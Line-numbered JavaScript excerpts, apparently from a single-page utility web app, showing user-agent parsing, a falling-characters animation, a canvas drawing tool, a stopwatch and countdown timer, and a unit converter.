2294:     else if (/Windows NT 6.2/.test(ua)) { os = "Windows"; osVersion = "8"; }
2295:     else if (/Windows NT 6.1/.test(ua)) { os = "Windows"; osVersion = "7"; }
2296:     else if (/Macintosh|Mac OS X/.test(ua)) { os = "macOS"; osVersion = ua.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, '.') || "Unknown"; }
2297:     else if (/Android/.test(ua)) { os = "Android"; osVersion = ua.match(/Android ([\d.]+)/)?.[1] || "Unknown"; deviceType = "Mobile"; }
2298:     else if (/iPhone|iPad|iPod/.test(ua)) { os = "iOS"; osVersion = ua.match(/OS ([\d_.]+)/)?.[1]?.replace(/_/g, '.') + " (iOS)" || "Unknown"; deviceType = "Mobile"; }
2299:     else if (/Linux/.test(ua)) { os = "Linux"; osVersion = "Unknown"; } // More specific Linux versions are hard from UA
2300: 
2301:     // Device Type refinement
2302:     if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "Tablet";
2303:     if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile|webos|fennec|kindle/i.test(ua)) deviceType = "Mobile";
2304: 
2305:     return { browserName, browserVersion, os, osVersion, engine, deviceType };
2306: }

2579: function generateCodeRain(containerId) {
2580:   const container = document.getElementById(containerId);
2581:   const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
2582:   
2583:   setInterval(() => {
2584:     const char = document.createElement('div');
2585:     char.className = 'code-char';
2586:     char.textContent = chars[Math.floor(Math.random() * chars.length)];
2587:     char.style.left = Math.random() * 100 + '%';
2588:     char.style.animationDelay = Math.random() * 2 + 's';
2589:     container.appendChild(char);
2590:     
2591:     setTimeout(() => {
2592:       if (char.parentNode) {
2593:         char.parentNode.removeChild(char);
2594:       }
2595:     }, 3000);
2596:   }, 100);
2597: }

3022: function startDrawing(e) {

3031: 
3032: function draw(e) {
3033:   if (!isDrawing) return;
3034:   
3035:   const rect = canvas.getBoundingClientRect();
3036:   const x = e.clientX - rect.left;
3037:   const y = e.clientY - rect.top;
3038:   
3039:   ctx.lineWidth = currentThickness;
3040:   ctx.lineCap = 'round';
3041:   ctx.strokeStyle = currentTool === 'eraser' ? 'white' : currentColor;
3042:   
3043:   ctx.lineTo(x, y);
3044:   ctx.stroke();
3045:   ctx.beginPath();
3046:   ctx.moveTo(x, y);
3047: }

3049: function stopDrawing() {
3050:   isDrawing = false;

3471: // Timer functions
3472: function startStopwatch() {
3473:   if (!isStopwatchRunning) {
3474:     isStopwatchRunning = true;
3475:     stopwatchInterval = setInterval(() => {
3476:       stopwatchTime++;
3477:       updateStopwatchDisplay();
3478:     }, 10);
3479:     logActivity('Stopwatch started');
3480:   }
3481: }
3482: 
3483: function pauseStopwatch() {
3484:   if (isStopwatchRunning) {
3485:     isStopwatchRunning = false;
3486:     clearInterval(stopwatchInterval);
3487:     logActivity('Stopwatch paused');
3488:   }
3489: }
3490: 
3491: function resetStopwatch() {
3492:   isStopwatchRunning = false;
3493:   clearInterval(stopwatchInterval);
3494:   stopwatchTime = 0;
3495:   updateStopwatchDisplay();
3496:   logActivity('Stopwatch reset');
3497: }

3499: function updateStopwatchDisplay() {
3500:   const totalSeconds = Math.floor(stopwatchTime / 100);
3501:   const hours = Math.floor(totalSeconds / 3600);
3502:   const minutes = Math.floor((totalSeconds % 3600) / 60);
3503:   const seconds = totalSeconds % 60;
3504:   const centiseconds = stopwatchTime % 100;
3505:   
3506:   document.getElementById('stopwatchDisplay').textContent = 
3507:     `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}.${centiseconds.toString().padStart(2, '0')}`;
3508: }

3510: function startTimer() {
3511:   const hours = parseInt(document.getElementById('timerHours').value) || 0;
3512:   const minutes = parseInt(document.getElementById('timerMinutes').value) || 0;
3513:   const seconds = parseInt(document.getElementById('timerSeconds').value) || 0;
3514:   
3515:   timerTime = (hours * 3600) + (minutes * 60) + seconds;
3516:   
3517:   if (timerTime > 0 && !isTimerRunning) {
3518:     isTimerRunning = true;
3519:     timerInterval = setInterval(() => {
3520:       timerTime--;
3521:       updateTimerDisplay();
3522:       
3523:       if (timerTime <= 0) {
3524:         pauseTimer();
3525:         showNotification('Timer finished!');
3526:         logActivity('Timer completed');
3527:       }
3528:     }, 1000);
3529:     logActivity('Timer started');
3530:   }

3691: function convertUnits() {
3692:   const fromValue = parseFloat(document.getElementById('fromValue').value);
3693:   const fromUnit = document.getElementById('fromUnit').value;
3694:   const toUnit = document.getElementById('toUnit').value;
3695:   const type = document.getElementById('conversionType').value;
3696:   
3697:   if (isNaN(fromValue)) {
3698:     document.getElementById('toValue').value = '';
3699:     return;
3700:   }
3701:   
3702:   let result = fromValue;
3703:   
3704:   const factors = {
3705:     length: { 
3706:       'm': 1, 'km': 1000, 'cm': 0.01, 'mm': 0.001, 'in': 0.0254, 'ft': 0.3048
3707:     },
3708:     weight: { 
3709:       'kg': 1000, 'g': 1, 'lb': 453.592, 'oz': 28.3495
3710:     },
3711:     temperature: { 
3712:     },
3713:     volume: { 
3714:         'l': 1, 'ml': 0.001, 'gal': 3.78541, 'qt': 0.946353
3715:     }
3716:   };
3717:   
3718:   if (type === 'length') {
3719:     result = fromValue * factors.length[fromUnit] / factors.length[toUnit];
3720:   } else if (type === 'weight') {
3721:     result = fromValue * factors.weight[fromUnit] / factors.weight[toUnit];
3722:   } else if (type === 'volume') {
3723:     result = fromValue * factors.volume[fromUnit] / factors.volume[toUnit];
3724:   } else if (type === 'temperature') {
3725:       let tempInC;
3726:       if (fromUnit === 'c') tempInC = fromValue;
3727:       else if (fromUnit === 'f') tempInC = (fromValue - 32) * 5/9;
3728:       else if (fromUnit === 'k') tempInC = fromValue - 273.15;
3729: 
3730:       if (toUnit === 'c') result = tempInC;
3731:       else if (toUnit === 'f') result = (tempInC * 9/5) + 32;
3732:       else if (toUnit === 'k') result = tempInC + 273.15;
3733:   }
3734:   
3735:   document.getElementById('toValue').value = result.toFixed(6);
3736:   logActivity(`Unit converted: ${fromValue} ${fromUnit} to ${result.toFixed(6)} ${toUnit}`);
3737: }
```
